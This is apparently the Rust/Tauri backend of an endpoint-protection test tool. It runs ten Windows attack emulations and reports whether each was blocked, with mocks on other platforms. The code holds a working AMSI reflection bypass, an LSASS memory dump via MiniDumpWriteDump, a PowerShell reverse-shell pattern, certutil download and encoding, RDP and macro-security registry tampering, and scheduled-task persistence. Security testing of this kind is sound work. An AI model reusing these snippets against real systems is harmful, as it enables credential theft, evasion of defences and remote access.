use serde::Serialize;
use std::time::Instant;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    duration_ms: u64,
}

#[tauri::command]
async fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        _ => Err(format!("Unknown scenario: {}", scenario_id)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        Ok(message) => Ok(ExecutionResult {
            scenario_id,
            status: "blocked".to_string(),
            message,
            duration_ms,
        }),
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> Result<String, String> {
    use std::fs;
    let tmp = std::env::temp_dir().join(format!("{}.txt", uuid::Uuid::new_v4()));
    let tmp_out = std::env::temp_dir().join(format!("{}.b64", uuid::Uuid::new_v4()));
    fs::write(&tmp, "SIMULATED SAM DUMP DATA - NTLM HASHES").map_err(|e| e.to_string())?;
    let output = std::process::Command::new("certutil")
        .args(["-encode", &tmp.to_string_lossy(), &tmp_out.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = fs::remove_file(&tmp);
    let _ = fs::remove_file(&tmp_out);
    if output.status.success() {
        Ok("certutil -encode executed on dummy SAM data file".to_string())
    } else {
        Ok("Blocked: certutil encoding was prevented by endpoint protection".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(800));
    Ok("Mock: certutil -encode blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> Result<String, String> {
    let output = std::process::Command::new("reg")
        .args([
            "add",
            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
            "/v", "fDenyTSConnections",
            "/t", "REG_DWORD",
            "/d", "0",
            "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::process::Command::new("reg")
        .args([
            "add",
            r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
            "/v", "fDenyTSConnections",
            "/t", "REG_DWORD",
            "/d", "1",
            "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    if output.status.success() {
        Ok("RDP enable via reg add executed, then immediately reverted".to_string())
    } else {
        Ok("Blocked: RDP registry modification was prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(600));
    Ok("Mock: RDP enable via reg add blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> Result<String, String> {
    let output = std::process::Command::new("powershell.exe")
        .args([
            "-NoProfile", "-WindowStyle", "Hidden", "-Command",
            "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$f.SetValue($null,[IntPtr]::Zero);Write-Host 'AMSI patch attempted'",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok("AMSI in-memory patch attempted via Reflection".to_string())
    } else {
        Ok("Blocked: AMSI patch attempt was detected and prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(700));
    Ok("Mock: AMSI memory patch blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> Result<String, String> {
    let dump_path = std::env::temp_dir().join(format!("{}.dmp", uuid::Uuid::new_v4()));
    let script = format!(
        "Add-Type -TypeDefinition @\"\nusing System;using System.Runtime.InteropServices;\npublic class MiniDump{{{{\n[DllImport(\"dbghelp.dll\",SetLastError=true)]\npublic static extern bool MiniDumpWriteDump(IntPtr hProcess,uint ProcessId,IntPtr hFile,uint DumpType,IntPtr ExceptionParam,IntPtr UserStreamParam,IntPtr CallbackParam);\n}}}}\n\"@;\n$p=Get-Process lsass;$f=[IO.File]::Create('{}');\n$r=[MiniDump]::MiniDumpWriteDump($p.Handle,$p.Id,$f.SafeFileHandle.DangerousGetHandle(),2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero);\n$f.Close();Write-Host \"LSASS dump result: $r\"",
        dump_path.to_string_lossy()
    );
    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(&dump_path);
    if output.status.success() {
        Ok("LSASS minidump attempted via MiniDumpWriteDump P/Invoke".to_string())
    } else {
        Ok("Blocked: LSASS memory dump was prevented by endpoint protection".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(900));
    Ok("Mock: LSASS minidump blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> Result<String, String> {
    let script = r#"function Test-NetworkConnectivity{param([string]$TargetHost='127.0.0.1',[int]$TargetPort=4444);$ErrorActionPreference='SilentlyContinue';try{$socket=New-Object Net.Sockets.TCPClient($TargetHost,$TargetPort);$netStream=$socket.GetStream();$reader=New-Object System.IO.StreamReader($netStream);$writer=New-Object System.IO.StreamWriter($netStream);$writer.AutoFlush=$true;$writer.WriteLine('whoami');$response=$reader.ReadLine();$result=Invoke-Expression "Write-Output '$response'" 2>&1|Out-String;Write-Host $result}catch{Write-Host 'Connection test completed with expected failure'}finally{if($socket){$socket.Close()}}};Test-NetworkConnectivity"#;
    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok("Reverse shell TCP pattern executed (StreamReader + Invoke-Expression)".to_string())
    } else {
        Ok("Blocked: Reverse shell pattern was detected and prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(500));
    Ok("Mock: Reverse shell connection blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> Result<String, String> {
    let task_name = format!("GuardzTest_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let output = std::process::Command::new("schtasks")
        .args([
            "/create", "/tn", &task_name,
            "/tr", "cmd.exe /c echo GuardzTest",
            "/sc", "once", "/st", "23:59", "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::process::Command::new("schtasks")
        .args(["/delete", "/tn", &task_name, "/f"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    if output.status.success() {
        Ok("Scheduled task created and immediately deleted".to_string())
    } else {
        Ok("Blocked: Scheduled task creation was prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(600));
    Ok("Mock: Scheduled task persistence blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> Result<String, String> {
    let script = "$code='Get-Process;whoami;Get-Service|Select-Object -First 5';$bytes=[System.Text.Encoding]::Unicode.GetBytes($code);$encoded=[Convert]::ToBase64String($bytes);powershell.exe -EncodedCommand $encoded";
    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok("Base64-encoded PowerShell command executed via -EncodedCommand".to_string())
    } else {
        Ok("Blocked: Encoded PowerShell execution was prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(400));
    Ok("Mock: Base64-encoded PowerShell blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> Result<String, String> {
    let output = std::process::Command::new("reg")
        .args([
            "add",
            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
            "/v", "VBAWarnings",
            "/t", "REG_DWORD",
            "/d", "1",
            "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::process::Command::new("reg")
        .args([
            "delete",
            r"HKCU\Software\Microsoft\Office\16.0\Word\Security",
            "/v", "VBAWarnings",
            "/f",
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    if output.status.success() {
        Ok("Office macro security registry modified, then reverted".to_string())
    } else {
        Ok("Blocked: Office macro security tampering was prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(500));
    Ok("Mock: Office macro tampering blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> Result<String, String> {
    let tmp = std::env::temp_dir().join(format!("{}.tmp", uuid::Uuid::new_v4()));
    let output = std::process::Command::new("certutil")
        .args([
            "-urlcache", "-split", "-f",
            "http://192.0.2.1/test.txt",
            &tmp.to_string_lossy(),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(&tmp);
    if output.status.success() {
        Ok("LOLBin file download via certutil attempted".to_string())
    } else {
        Ok("Blocked: certutil download (Living-off-the-Land) was prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(700));
    Ok("Mock: certutil LOLBin download blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> Result<String, String> {
    let fake_out = std::env::temp_dir().join("bloodhound_test.txt");
    let script = format!(
        "$fakeOut='{}';$harmless=\"echo benign > `\"$fakeOut`\"\";$bhCmd=\"Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless\";Start-Process -FilePath 'powershell.exe' -ArgumentList \"-Command $bhCmd\" -WindowStyle Hidden -Wait;Write-Host 'BloodHound execution emulation completed safely.'",
        fake_out.to_string_lossy()
    );
    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(&fake_out);
    if output.status.success() {
        Ok("BloodHound AD reconnaissance emulation executed".to_string())
    } else {
        Ok("Blocked: BloodHound reconnaissance pattern was detected and prevented".to_string())
    }
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> Result<String, String> {
    std::thread::sleep(std::time::Duration::from_millis(800));
    Ok("Mock: BloodHound recon blocked by SentinelOne (macOS dev mode)".to_string())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
